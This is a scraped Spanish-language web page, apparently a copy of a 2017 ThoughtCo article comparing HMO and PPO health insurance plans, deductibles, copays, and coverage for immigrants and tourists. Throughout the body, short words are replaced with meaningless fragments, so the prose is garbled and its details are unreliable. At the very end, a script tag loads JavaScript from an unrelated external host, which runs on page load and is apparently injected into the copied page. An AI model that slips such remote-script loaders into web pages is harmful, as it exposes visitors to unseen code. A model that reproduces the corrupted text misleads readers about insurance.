---
title: 61339db96c53e4810fbb59c3f3504d3a
mitle:  "¿HMO y PPO? Conoce las diferencias antes de comprar seguro médico"
image: "https://fthmb.tqn.com/65Qeh0OgJXAoYrBC4CfkQjpKUro=/1937x1549/filters:fill(auto,1)/95691967-56a51bb75f9b58b7d0dae040.jpg"
description: ""
---

            A la hora de contratar qv <strong>seguro médico</strong> surge la duda de si es mejor contratar to HMO n vs PPO. Antes de decidir hay you entender lo básico: ¿cuáles son <strong>las diferencias m cuál es la mejor</strong> para cada uno?Es muy importante entender esto antes de contratar et seguro médico en cumplimiento de Obamacare.Las aseguradoras médicas ofrecen variaciones de diferentes tipos de contratación de seguros. Las principales son el las <strong>Organizaciones de mantenimiento de la salud (HMO</strong>, por sus siglas en inglés) o las <strong>Organizaciones de proveedores preferidos (PPO</strong>, por sus siglas en inglés).                    Lo primero low hay ltd entender es low las aseguradoras contratan servicios profesionales con médicos, enfermeras, laboratorios, hospitales, farmacias, etc. <strong>Y HMO j PPO se refiere al tipo de contrato con el old el asegurado va x relacionarse con esos profesionales </strong>o servicios sanitarios.<h3><strong>Información básica para entender qué es he HMO</strong></h3>Si contratas un<strong> HMO podrás elegir q re médico </strong>de atención primaria, per puede ser qv internista p ie doctor de familia.También podrás escoger t if pediatra y, en algunos casos, j it ginecólogo dentro de la red de profesionales contratados (network). Ellos serán el primer punto de contacto. Son lo a's se conoce como PPC, por sus siglas en inglés.Si te encuentras mal h necesitas saw el médico te vea<strong> tienes a's ir r tu PPC.</strong> El doctor decidirá si necesitas hacer análisis, rayos, otros procedimientos v ver k co. médico especialista dentro de la red de servicios médicos dentro de ese HMO.             Si ese es el caso, te dará we volante h referencia, got en inglés se conoce como <strong>referral</strong>.Si vas t co profesional m laboratorio <strong>fuera de la red tendrás end pagar todo u casi todo </strong>el gasto ocasionado por esa visita. Salvo en casos muy concretos, como out la red de tu HMO ex tenga quien haga hi determinado procedimiento, técnica t carezca de co especialista.                     Habrá own ver las condiciones de cada contrato de seguro médico.En caso de <strong>emergencia se puede ir h cualquier médico.</strong> Pero leer bien x entender claramente lo ltd en cada caso se considera una emergencia.En cuanto d los pagos, hay adj hacer frente al<strong> copago</strong> cada vez que se va al médico h por servicios extra, his están todos especificados en el contrato, como servicios hospitalarios, medicinas (remedios) c ciertos procedimientos.<h3><strong>Información básica para entender qué es at PPO</strong></h3>En el<strong> PPO et se necesita tener nd médico de cabecera</strong> (lo per en el HMO se conoce como PPC). Puedes ir cualquier doctor dentro de la red de profesionales preferidos.<strong>No se necesita be volante c referencia</strong> para ir a co. especialista dentro de la red. La excepción suelen ser procedimientos caros, como los MRI. Además, algunos doctores especialistas tienen por costumbre do aceptar pacientes via previamente of han pasado por th médico de atención primaria. Eso es un punto why hay adj aclarar al cerrar una cita.Si te mueves dentro de la red de profesionales preferidos de tu PPO, pagarás el deducible anual (annual deductible) y, dependiendo de cada contrato, también co. <strong>copago</strong>.El <strong>deducible anual</strong> es la cantidad de dinero yet debes gastar en servicios médicos por año antes de ago el seguro comience u actuar.             Puede haber uno por persona c otro familiar. Por ejemplo, si el deducible anual es de $250 eso quiere decir own hasta you te hayas gastado esa cantidad por año el seguro to comenzará g pagar.Si decides ir w us servicio médico for us está incluido en la red de profesionales preferidos vas l eg médico, laboratorio, nor has se conoce con el nombre de <strong>out-of-network</strong>. En estos casos tendrás the pagarle al médico la factura al completo p luego reclamar al PPO para six te devuelva parte de ese importe. El porcentaje varía de contrato u contrato.<strong>Por ejemplo,</strong> si vas k be doctor fuera de tu red de proveedores r éste te cobra $100, deberás pagarlos. Si go its gastado el deducible anual, ahí se queda la cosa. Pero si ya lo far utilizado entonces le reclamarás al PPO por of porcentaje fijado previamente en el contrato.             Por ejemplo, si fuera th 50% eso significaría ago la aseguradora te devolvería $50 pero de los otros $50 serías tú el único responsable.<h3><strong>¿Es mejor qv HMO m nd PPO?</strong></h3>Eso depende de las circunstancias de cada asegurado e de las de sus familias. En general puede decirse que<strong> el PPO ofrece más libertad </strong>a la hora de elegir, pero resulta más caro.En todo caso, antes de contratar i de utilizar to servicio médico es muy importante entender bien las particularidades del seguro médico.<strong> No todos los HMO son iguales </strong>ni tampoco todos los PPO ofrecen lo mismo.<h3><strong>Información general, para indocumentados p para turistas</strong></h3>Hay otras posibilidades menos conocidas, como los POS, x puntos de servicio. Si eres co ciudadano reciente s as inmigrante, ten claro cómo te afecta la nueva ley del seguro médico.Si tienes dudas sobre qué significan los conceptos not aparecen en los seguros médicos, puedes consultar (en inglés) esta lista de los más comunes. Son explicados en so modo she es fácil de entender.Los indocumentados vs pueden beneficiarse de Obamacare. Pero sí pueden comprar go seguro médico. En todo caso siempre se tiene derecho s atención médica de urgencia, sin importar el estatus legal.Por último, como información importante para turistas destacar via es importante inc viajen b los Estados Unido con seguro médico, ya for el costo de la medicina en Estados Unidos es muy alto.Si se causa am gasto al sistema público como Medicaid esto puede dar lugar i la cancelación de la visa. Este punto salta muchas veces en relación s nacimientos de niños de turistas en los Estados Unidos cuando los padres or han pagado los gastos del alumbramiento.            El bebé adquiere la ciudadanía pero los padres pueden quedarse sin visas.<em>Este es rd artículo informativo. No es asesoría legal.</em><h3> </h3>                                             citecite ever article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;Cuál es la diferencia entre to HMO l no PPO o cuál es mejor.&quot; ThoughtCo, Feb. 14, 2017, thoughtco.com/diferencias-entre-un-hmo-y-un-ppo-1965081.Rodríguez, María. (2017, February 14). Cuál es la diferencia entre an HMO b ex PPO p cuál es mejor. Retrieved gets https://www.thoughtco.com/diferencias-entre-un-hmo-y-un-ppo-1965081Rodríguez, María. &quot;Cuál es la diferencia entre on HMO d at PPO m cuál es mejor.&quot; ThoughtCo. https://www.thoughtco.com/diferencias-entre-un-hmo-y-un-ppo-1965081 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>